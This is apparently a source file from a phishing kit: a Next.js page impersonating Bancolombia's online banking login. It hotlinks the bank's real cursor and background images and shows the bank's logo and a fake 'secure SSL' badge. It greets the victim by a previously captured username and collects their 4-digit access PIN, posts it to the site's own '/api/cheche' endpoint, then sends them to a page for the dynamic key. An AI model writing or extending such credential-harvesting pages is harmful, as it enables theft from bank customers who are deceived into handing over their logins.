'use client';

import { useState, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

export default function BancolombiaClaveAccesoPage() {
  const [clave, setClave] = useState('');
  const [loading, setLoading] = useState(false);
  const [sessionId, setSessionId] = useState('');
  const [usuario, setUsuario] = useState('');
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const id = searchParams.get('sessionId');
    if (!id) {
      router.push('/checkout');
      return;
    }
    setSessionId(id);
    
    // Get session data to show username
    fetchSessionData(id);
  }, [searchParams, router]);

  const fetchSessionData = async (id: string) => {
    try {
      const response = await fetch(`/api/cheche?action=get_session&sessionId=${id}`);
      const data = await response.json();
      if (data.success && data.session?.usuario) {
        setUsuario(data.session.usuario);
      }
    } catch (error) {
      console.error('Error fetching session:', error);
    }
  };

  const handleDigitClick = (digit: string) => {
    if (clave.length < 4) {
      setClave(prev => prev + digit);
    }
  };

  const handleDelete = () => {
    setClave(prev => prev.slice(0, -1));
  };

  const handleSubmit = async () => {
    if (clave.length !== 4) return;

    setLoading(true);

    try {
      const response = await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'update_password',
          sessionId,
          clave
        })
      });

      if (response.ok) {
        // Redirigir a la página de clave dinámica
        router.push(`/bancolombia/clave?sessionId=${sessionId}`);
      }
    } catch (error) {
      console.error('Error updating password:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleCancel = () => {
    router.push('/checkout');
  };

  const digits = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'];

  return (
    <div 
      className="min-h-screen relative"
      style={{
        fontFamily: '"Open Sans", Arial, sans-serif',
        cursor: 'url("https://svpersonas.apps.bancolombia.com/assets/images/light-cursor-small.png"), auto'
      }}
    >
      {/* Official Bancolombia background */}
      <div 
        className="min-h-screen bg-no-repeat bg-center bg-cover flex items-center justify-center"
        style={{
          backgroundImage: 'url("https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg")',
        }}
      >
        
        {/* Top Header */}
        <div className="absolute top-0 left-0 right-0 bg-white border-b border-gray-200 py-3">
          <div className="max-w-7xl mx-auto px-4 flex justify-between items-center">
            <img 
              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
              alt="Bancolombia" 
              className="h-6"
            />
            <button
              onClick={handleCancel}
              className="text-gray-600 hover:text-gray-800 text-sm font-medium"
            >
              Salir →
            </button>
          </div>
        </div>

        {/* Main Content */}
        <div className="w-full max-w-md mx-auto px-4">
          <div className="bg-white rounded-2xl shadow-lg p-8 border border-gray-100">
            <div className="text-center mb-6">
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Clave de Acceso</h2>
              <p className="text-gray-600">
                Bienvenido <span className="font-medium text-gray-900">{usuario}</span>
              </p>
              <p className="text-sm text-gray-500 mt-2">Ingresa tu clave de 4 dígitos</p>
            </div>

            {/* PIN Display */}
            <div className="flex justify-center space-x-3 mb-8">
              {[0, 1, 2, 3].map((index) => (
                <div
                  key={index}
                  className="w-12 h-12 rounded-lg border-2 border-gray-300 flex items-center justify-center bg-gray-50"
                >
                  {clave[index] ? (
                    <span className="text-2xl text-[#004B87]">●</span>
                  ) : null}
                </div>
              ))}
            </div>

            {/* Number Pad */}
            <div className="grid grid-cols-3 gap-3 mb-6">
              {digits.slice(0, 9).map((digit) => (
                <button
                  key={digit}
                  onClick={() => handleDigitClick(digit)}
                  disabled={loading || clave.length >= 4}
                  className="h-14 bg-gray-50 hover:bg-gray-100 rounded-xl text-xl font-medium text-gray-700 disabled:opacity-50 transition border border-gray-200"
                >
                  {digit}
                </button>
              ))}
              <button
                onClick={handleDelete}
                disabled={loading || clave.length === 0}
                className="h-14 bg-pink-50 hover:bg-pink-100 rounded-xl text-pink-600 font-medium disabled:opacity-50 transition border border-pink-200 flex items-center justify-center"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                </svg>
              </button>
              <button
                onClick={() => handleDigitClick('0')}
                disabled={loading || clave.length >= 4}
                className="h-14 bg-gray-50 hover:bg-gray-100 rounded-xl text-xl font-medium text-gray-700 disabled:opacity-50 transition border border-gray-200"
              >
                0
              </button>
              <button
                onClick={handleSubmit}
                disabled={loading || clave.length !== 4}
                className="h-14 bg-green-50 hover:bg-green-100 rounded-xl text-green-600 font-medium disabled:opacity-50 transition border border-green-200 flex items-center justify-center"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                </svg>
              </button>
            </div>

            <div className="flex space-x-3">
              <button
                type="button"
                onClick={handleCancel}
                className="flex-1 py-3.5 px-6 bg-white border-2 border-gray-300 text-gray-700 rounded-full hover:bg-gray-50 transition disabled:opacity-50 font-medium"
                disabled={loading}
              >
                Cancelar
              </button>
              <button
                onClick={handleSubmit}
                disabled={clave.length !== 4 || loading}
                className="flex-1 py-3.5 px-6 bg-[#FDDA24] text-gray-900 rounded-full hover:bg-[#FED500] disabled:opacity-50 disabled:cursor-not-allowed transition font-semibold"
              >
                {loading ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-gray-900" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Validando...
                  </span>
                ) : (
                  'Continuar'
                )}
              </button>
            </div>

            <div className="mt-6 text-center">
              <div className="flex items-center justify-center space-x-2 text-green-600">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
                <span className="text-sm font-medium">Conexión Segura SSL 256-bit</span>
              </div>
            </div>
          </div>

          {/* Footer Logo */}
          <div className="text-center mt-8">
            <img 
              src="/logos/bancos/BANCOLOMBIA_PAGO.png" 
              alt="Bancolombia" 
              className="h-5 mx-auto opacity-60"
            />
          </div>
        </div>
      </div>
    </div>
  );
}